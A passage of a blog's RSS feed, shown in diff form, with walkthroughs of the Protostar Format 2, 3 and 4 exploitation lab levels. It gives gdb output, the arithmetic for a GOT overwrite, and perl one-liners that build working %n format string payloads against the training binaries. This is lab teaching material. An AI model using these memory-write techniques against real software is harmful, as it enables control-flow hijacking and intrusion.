+&lt;p&gt;What we need to do, is examine the address of the GOT space for the &amp;ldquo;exit()&amp;rdquo; method, and now see what was set.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;(gdb) x/1x 0x08049724
+0x8049724 &amp;lt;_GLOBAL_OFFSET_TABLE_+36&amp;gt;:   0x00000010
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Good, so far we know: &lt;ul&gt;&lt;li&gt;GOT address to overwrite: 0x8049724&lt;/li&gt;&lt;li&gt;Value to overwrite it with: 0x080484b4&lt;/li&gt;&lt;/ul&gt;
+We can use this data to now calculate all of the individual buffer sizes needed to get the right number of characters output by &amp;ldquo;printf&amp;rdquo;.  This little trick was learned from reading &lt;a href=&#34;http://www.amazon.com/gp/product/1593271441/ref=as_li_ss_tl?ie=UTF8&amp;amp;tag=mattandcom-20&amp;amp;linkCode=as2&amp;amp;camp=1789&amp;amp;creative=390957&amp;amp;creativeASIN=1593271441&#34;&gt;Hacking: The Art of Exploitation, 2nd Edition&lt;/a&gt;&lt;img src=&#34;http://www.assoc-amazon.com/e/ir?t=mattandcom-20&amp;l=as2&amp;o=1&amp;a=1593271441&#34; width=&#34;1&#34; height=&#34;1&#34; border=&#34;0&#34; alt=&#34;&#34; style=&#34;border:none !important; margin:0px !important;&#34; /&gt;, which I highly recommend.  Without this book, I would have been stuck on these format string levels for a lot longer than I was. I just needed a little bump, and it gave it to me.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ gdb -q
+(gdb) p 0xb4 - 0x00000010
+$1 = 164
+(gdb) p 0x84 - 0xb4
+$2 = -48
+(gdb) p 0x184 - 0xb4
+$3 = 208
+(gdb) p 0x04 - 0x84
+$4 = -128
+(gdb) p 0x104 - 0x84
+$5 = 128
+(gdb) p 0x08 - 0x04
+$6 = 4
+(gdb) p 0x108 - 0x04
+$7 = 260
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;To explain this, you take the address you want to overwrite with (0x080484b4 in our case) and split it up into the byte pairs in little endian order (b4, 84, 08, 08).  Starting with the first one (b4), you subtract the base number we saw get written before (0x00000010), and that will give us the first buffer length of 164.  For the second one, take the 2nd byte pair (84) and subtract the first byte pair (b4).  In this case, we went negative, so we add a &amp;ldquo;1&amp;rdquo; in the most significant digit of the first number, making ours &amp;ldquo;184&amp;rdquo;.  We then subtract again, and get 208.  You do this for all 4 pairs, and you get your offsets of 164, 208, 128, 260.&lt;/p&gt;
+
+&lt;p&gt;Now that we have our buffer sizes, let&amp;rsquo;s construct the format string with them:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ perl -e &#39;print &amp;quot;\x24\x97\x04\x08&amp;quot;.&amp;quot;\x25\x97\x04\x08&amp;quot;.&amp;quot;\x26\x97\x04\x08&amp;quot;.&amp;quot;\x27\x97\x04\x08&amp;quot;.&amp;quot;%164x%4\$n&amp;quot;.&amp;quot;%208x%5\$n&amp;quot;.&amp;quot;%128x%6\$n&amp;quot;.&amp;quot;%260x%7\$n&amp;quot;&#39; &amp;gt; /home/user/format4_dpa
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Lastly, we run the format4 program with the format4_dpa file as the input:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ ./format4 &amp;lt; /home/user/format4_dpa           $%&amp;amp;&#39;                                                              
+
+                                                                                                   200                                            
+
+                                                                                                                                                  
+
+          b7fd8420                                                                                                                        
+
+bffff624                                                                                                                                          
+
+                                                                                                                   8049724code execution 
+
+redirected! you win
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And that&amp;rsquo;s a win!&lt;/p&gt;
+
+&lt;p&gt;I learned a lot of things in this section of the Protostar challenge.  I had almost no experience with format string exploitation, but now I&amp;rsquo;m feeling pretty comfortable with them.  We&amp;rsquo;ll have to see about the &lt;a href=&#34;http://exploit-exercises.com/protostar/final1&#34;&gt;Final 1&lt;/a&gt; level.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Exploit Exercises - Protostar Format 3</title>
+      <link>https://www.mattandreko.com/blog/2012-02-01-exploit-exercises-protostar-format-3/</link>
+      <pubDate>Wed, 01 Feb 2012 05:33:00 -0500</pubDate>
+      
+      <guid>https://www.mattandreko.com/blog/2012-02-01-exploit-exercises-protostar-format-3/</guid>
+      <description>&lt;p&gt;Continuing in the String Format section, the next challenge we run across is &lt;a href=&#34;http://exploit-exercises.com/protostar/format3&#34;&gt;Format 3&lt;/a&gt;.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;We&amp;rsquo;re first given the following code:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+
+int target;
+
+void printbuffer(char *string)
+{
+ printf(string);
+}
+
+void vuln()
+{
+ char buffer[512];
+
+ fgets(buffer, sizeof(buffer), stdin);
+
+ printbuffer(buffer);
+
+ if(target == 0x01025544) {
+  printf(&amp;quot;you have modified the target :)\n&amp;quot;);
+ } else {
+  printf(&amp;quot;target is %08x :(\n&amp;quot;, target);
+ }
+}
+
+int main(int argc, char **argv)
+{
+ vuln();
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This seems to be just like Format 2, except that we have to modify all 8 bytes instead of just 2.&lt;/p&gt;
+
+&lt;p&gt;The process is still pretty much the same.  We will first find the memory address of &amp;ldquo;target&amp;rdquo;, to get that out of the way:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ objdump -t format3 | grep target
+080496f4 g     O .bss   00000004              target
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I tried spamming the format3 executable with 15 &amp;ldquo;%x&amp;rdquo;, since the last couple challenges have been lower than the typical 150 I was doing.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo AAAA`perl -e &#39;print &amp;quot;%x.&amp;quot;x15&#39;` | ./format3
+AAAA0.bffff5e0.b7fd7ff4.0.0.bffff7e8.804849d.bffff5e0.200.b7fd8420.bffff624.41414141.252e7825.78252e78.2e78252e.
+target is 00000000 :(
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It appears that we get our &amp;ldquo;41414141&amp;rdquo; at 12 bytes popped.  Let&amp;rsquo;s verify:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo AAAA%x%x%x%x%x%x%x%x%x%x%x%x | ./format3
+AAAA0bffff5e0b7fd7ff400bffff7e8804849dbffff5e0200b7fd8420bffff62441414141
+target is 00000000 :(
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So let&amp;rsquo;s try it with the memory address of &amp;ldquo;target&amp;rdquo; instead of &amp;ldquo;AAAA&amp;rdquo;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `perl -e &#39;print &amp;quot;\xf4\x96\x04\x08%x%x%x%x%x%x%x%x%x%x%x%n&amp;quot;&#39;` | ./format3
+0bffff5e0b7fd7ff400bffff7e8804849dbffff5e0200b7fd8420bffff624
+target is 00000041 :(
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Awesome! It&amp;rsquo;s overwriting properly.  Our last byte shows as &amp;ldquo;41&amp;rdquo;, meaning that printf wrote 41 characters.  However for the vulnerable program, it needs to be &amp;ldquo;44&amp;rdquo;, so let&amp;rsquo;s just increase it a little.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `perl -e &#39;print &amp;quot;\xf4\x96\x04\x08%x%x%x%x%x%x%x%x%x%x%11x%n&amp;quot;&#39;` | ./format3
+0bffff5e0b7fd7ff400bffff7e8804849dbffff5e0200b7fd8420bffff624
+target is 00000044 :(
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So it appears if I use &amp;ldquo;%11x&amp;rdquo; for one of the stack pops, it&amp;rsquo;s just the right amount.  You can actually calculate this value using a calculator, but I&amp;rsquo;ve found myself usually just brute forcing it with multiple guesses.&lt;/p&gt;
+
+&lt;p&gt;So let&amp;rsquo;s work on the next 2 bytes. From several of the books and papers listed in the previous challenge, I found out how to handle this. You just start appending more data, with a junk buffer, and possibly some spacing, and it will continue in a similar fashion. You then just increment the byte you want to overwrite, going upwards in the memory space, so you don&amp;rsquo;t overwrite the space you already wrote the first time.&lt;/p&gt;
+
+&lt;p&gt;To feel out for how many stack pops we&amp;rsquo;d have to do, I experimented, and spammed an additional 15 after setting up the start of the next byte of &amp;ldquo;target&amp;rdquo;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `perl -e &#39;print &amp;quot;\xf4\x96\x04\x08%x%x%x%x%x%x%x%x%x%x%11x%nJUNKAAAAAAAA\xf5\x96\x04\x08&amp;quot; . &amp;quot;%x.&amp;quot;x15&#39;` | ./format3
+0bffff5e0b7fd7ff400bffff7e8804849dbffff5e0200b7fd8420bffff624JUNKAAAAAAAA78257825.78257825.78257825.78257825.78257825.78313125.554a6e25.41414b4e.41414141.96f54141.78250804.2e78252e.252e7825.78252e78.2e78252e.
+target is 00000044 :(
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now pay attention here. You&amp;rsquo;ll see after 8 stack pops, you have &amp;ldquo;41414b4e.41414141&amp;rdquo;.  The first byte has some junk from a previous memory address. Since we can only pass 4 &amp;ldquo;A&amp;rdquo;s, we&amp;rsquo;ll need to buffer this a bit with additional junk bytes. To test that out, we can do:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `perl -e &#39;print &amp;quot;\xf4\x96\x04\x08%x%x%x%x%x%x%x%x%x%x%11x%nJUNKJUAAAA\xf5\x96\x04\x08%x%x%x%x%x%x%x%x%x&amp;quot;&#39;` | ./format3
+0bffff5e0b7fd7ff400bffff7e8804849dbffff5e0200b7fd8420bffff624JUNKJUAAAA782578257825782578257825782578257825782578313125554a6e25554a4b4e41414141
+target is 00000044 :(
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now if we just convert that final &amp;ldquo;%x&amp;rdquo; to a &amp;ldquo;%n&amp;rdquo;, we&amp;rsquo;ll overwrite the second memory address shown with the number of bytes printed.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `perl -e &#39;print &amp;quot;\xf4\x96\x04\x08%x%x%x%x%x%x%x%x%x%x%11x%nJUNKJU\xf5\x96\x04\x08%x%x%x%x%x%x%x%x%n&amp;quot;&#39;` | ./format3
+0bffff5e0b7fd7ff400bffff7e8804849dbffff5e0200b7fd8420bffff624JUNKJU782578257825782578257825782578257825782578313125554a6e25554a4b4e
+target is 00008e44 :(
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Awesome again! We overwrote the next 2 bytes!  But wait a minute.  It overwrote &amp;ldquo;8e&amp;rdquo;, and we want to get &amp;ldquo;55&amp;rdquo;.  There is nothing that we can add to &amp;ldquo;8e&amp;rdquo; to get &amp;ldquo;55&amp;rdquo;, as it&amp;rsquo;s larger.  We can&amp;rsquo;t subtract, so this poses an issue.  However, there&amp;rsquo;s nothing saying that we can&amp;rsquo;t overwrite 4 bytes instead of just 2.  We could simply add to &amp;ldquo;8e&amp;rdquo; until we get &amp;ldquo;255&amp;rdquo;, since the next 4 bytes needed are &amp;ldquo;0255&amp;rdquo;.  I played around with some math, and found that I could do exactly that!&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `perl -e &#39;print &amp;quot;\xf4\x96\x04\x08%x%x%x%x%x%x%x%x%x%x%11x%nJUNKJU\xf5\x96\x04\x08%x%x%x%x%x%x%x%463x%n&amp;quot;&#39;` | ./format3
+0bffff5e0b7fd7ff400bffff7e8804849dbffff5e0200b7fd8420bffff624JUNKJU782578257825782578257825782578257825782578313125554a6e25554a4b4e
+target is 00025544 :(
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This is convenient for us, because now we don&amp;rsquo;t have to do 4 separate overwrites, we can skip the third one, moving directly to the fourth.  For this last pair, we will need to write &amp;ldquo;01&amp;rdquo;.  Off the bat, with such a low number, I knew that we&amp;rsquo;d have to do something similar, since there&amp;rsquo;s no way we would ever be writing 0 characters in printf.  We would just have to raise it to &amp;ldquo;101&amp;rdquo;, and the first &amp;ldquo;1&amp;rdquo; would get cut off into a virtual la-la land.&lt;/p&gt;
+
+&lt;p&gt;Again, let&amp;rsquo;s find the length of stack addresses to pop, by spamming 15 &amp;ldquo;%x&amp;rdquo;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `perl -e &#39;print &amp;quot;\xf4\x96\x04\x08%x%x%x%x%x%x%x%x%x%x%11x%nJUNKJU\xf5\x96\x04\x08%x%x%x%x%x%x%x%463x%nJUNKAAAA&amp;quot; . &amp;quot;%x.&amp;quot;x15&#39;` | ./format3
+0bffff5e0b7fd7ff400bffff7e8804849dbffff5e0200b7fd8420bffff624JUNKJU782578257825782578257825782578257825782578313125554a6e25554a4b4eJUNKAAAA78257825.78257825.78257825.34257825.25783336.4e554a6e.4141414b.2e782541.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.
+target is 00025544 :(
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This time we have 7 pops, and again the buffer is mis-aligned.  So let&amp;rsquo;s test the 7 pops and fixing the buffer alignment:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `perl -e &#39;print &amp;quot;\xf4\x96\x04\x08%x%x%x%x%x%x%x%x%x%x%11x%nJUNKJU\xf5\x96\x04\x08%x%x%x%x%x%x%x%463x%nJUNAAAA%x%x%x%x%x%x%x&amp;quot;&#39;` | ./format3
+0bffff5e0b7fd7ff400bffff7e8804849dbffff5e0200b7fd8420bffff624JUNKJU782578257825782578257825782578257825782578313125554a6e25554a4b4eJUNAAAA78257825782578257825782534257825257833364e554a6e41414141
+target is 00025544 :(
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Removing one character from the 4-char word &amp;ldquo;JUNK&amp;rdquo; seemed to do the trick.  We are now showing &amp;ldquo;41414141&amp;rdquo; as the last word again.&lt;/p&gt;
+
+&lt;p&gt;So let&amp;rsquo;s switch the last &amp;ldquo;%x&amp;rdquo; to &amp;ldquo;%n&amp;rdquo;, and the &amp;ldquo;AAAA&amp;rdquo; to our last memory address, and see what it outputs.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `perl -e &#39;print &amp;quot;\xf4\x96\x04\x08%x%x%x%x%x%x%x%x%x%x%11x%nJUNKJU\xf5\x96\x04\x08%x%x%x%x%x%x%x%463x%nJUN\xf7\x96\x04\x08%x%x%x%x%x%x%n&amp;quot;&#39;` | ./format3
+0bffff5e0b7fd7ff400bffff7e8804849dbffff5e0200b7fd8420bffff624JUNKJU782578257825782578257825782578257825782578313125554a6e25554a4b4eJUN78257825782578257825782534257825257833364e554a6e
+target is 8c025544 :(
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Alright, so it&amp;rsquo;s giving &amp;ldquo;8c&amp;rdquo;, and we need to get to &amp;ldquo;101&amp;rdquo;.  That&amp;rsquo;s roughly 117 bytes difference.  I started tinkering from there, and found that it needed 125 extra characters.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `perl -e &#39;print &amp;quot;\xf4\x96\x04\x08%x%x%x%x%x%x%x%x%x%x%11x%nJUNKJU\xf5\x96\x04\x08%x%x%x%x%x%x%x%463x%nJUN\xf7\x96\x04\x08%x%x%x%x%x%125x%n&amp;quot;&#39;` | ./format3
+0bffff5e0b7fd7ff400bffff7e8804849dbffff5e0200b7fd8420bffff624JUNKJU782578257825782578257825782578257825782578313125554a6e25554a4b4eJUN78257825782578257825782534257825257833364e554a6e
+you have modified the target :)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Awesome! We actually were able to overwrite an arbitrary value in memory to a specific value of our desire.  Think of the implications of this.  I was solving it, and afterwards read about a very new string format vulnerability in &amp;ldquo;sudo&amp;rdquo;.  More information can be read &lt;a href=&#34;http://www.sudo.ws/sudo/alerts/sudo_debug.html&#34;&gt;here&lt;/a&gt;.  These are real-world applications, and these bugs are found in the wild.  It really blows my mind.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Exploit Exercises - Protostar Format 2</title>
+      <link>https://www.mattandreko.com/blog/2012-01-31-exploit-exercises-protostar-format-2/</link>
+      <pubDate>Tue, 31 Jan 2012 05:13:00 -0500</pubDate>
+      
+      <guid>https://www.mattandreko.com/blog/2012-01-31-exploit-exercises-protostar-format-2/</guid>
+      <description>&lt;p&gt;Continuing from where we left off, we arrive at &lt;a href=&#34;http://exploit-exercises.com/protostar/format2&#34;&gt;Format 2&lt;/a&gt;.  It presents us with the following code:&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+
+int target;
+
+void vuln()
+{
+ char buffer[512];
+
+ fgets(buffer, sizeof(buffer), stdin);
+ printf(buffer);
+
+ if(target == 64) {
+  printf(&amp;quot;you have modified the target :)\n&amp;quot;);
+ } else {
+  printf(&amp;quot;target is %d :(\n&amp;quot;, target);
+ }
+}
+
+int main(int argc, char **argv)
+{
+ vuln();
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This challenge seems very similar to Format 1, in all but 2 ways:&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;The input is done via a fgets() instead of from the program arguments.&lt;/li&gt;
+&lt;li&gt;Instead of allowing just any change, it specifically requires &amp;ldquo;target&amp;rdquo; to be equal to &amp;ldquo;64&amp;rdquo;.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;We&amp;rsquo;ll start pretty much the same way as last time, spamming &amp;ldquo;%x&amp;rdquo;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `perl -e &#39;print &amp;quot;AAAAAAAA&amp;quot; . &amp;quot;%x.&amp;quot;x150&#39;` | ./format2
+AAAAAAAA200.b7fd8420.bffff624.41414141.41414141.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.a2e78.b7eada75.b7fd7ff4.80496b0.bffff7c8.8048338.b7ff1040.80496b0.bffff7f8.80484f9.b7fd8304.b7fd7ff4.80484e0.bffff7f8.b7ec6365.b7ff1040.bffff7f8.80484c6.80484e0.0.bffff878.b7eadc76.1.bffff8a4.bffff8ac.b7fe1848.bffff860.ffffffff.b7ffeff4.8048285.1.bffff860.b7ff0626.
+target is 0 :(
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This time, however, it seemed MUCH quicker to get the &amp;ldquo;41414141&amp;rdquo;, only 4 words.  Let&amp;rsquo;s verify:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ ./format2
+AAAA%x%x%x%x
+AAAA200b7fd8420bffff62441414141
+target is 0 :(
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So we&amp;rsquo;re getting to a pretty good point, let&amp;rsquo;s go ahead and find the memory address for &amp;ldquo;target&amp;rdquo;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ objdump -t format2 | grep target
+080496e4 g     O .bss   00000004              target
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Next, let&amp;rsquo;s put that address in, replacing the &amp;ldquo;AAAA&amp;rdquo;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `perl -e &#39;print &amp;quot;\xe4\x96\x04\x08%x%x%x%x&amp;quot;&#39;` | ./format2
+200b7fd8420bffff62480496e4
+target is 0 :(
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The address seems to be the last word, without any problems.  So if we convert the last &amp;ldquo;%x&amp;rdquo; to &amp;ldquo;%n&amp;rdquo;, it should overwrite that address in memory with the count of characters printed:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `perl -e &#39;print &amp;quot;\xe4\x96\x04\x08%x%x%x%n&amp;quot;&#39;` | ./format2
+200b7fd8420bffff624
+target is 23 :(
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Unfortunately, only 23 characters were written.  We can increase that number artificially by just changing the format string from &amp;ldquo;%x&amp;rdquo; to &amp;ldquo;%44x&amp;rdquo;.  This pads the string to be 44 characters long:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `perl -e &#39;print &amp;quot;\xe4\x96\x04\x08%44x%x%x%n&amp;quot;&#39;` | ./format2
+                                         200b7fd8420bffff624
+you have modified the target :)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;That&amp;rsquo;s pretty much how it&amp;rsquo;s done.&lt;/p&gt;
+
+&lt;p&gt;And again, as bonus, if you want to use Direct Argument Access, you can simply do:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `perl -e &#39;print &amp;quot;\xe4\x96\x04\x08%7\\\$60x%4\\\$n&amp;quot;&#39;` | ./format2
+                                                       a6e24
+you have modified the target :)
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
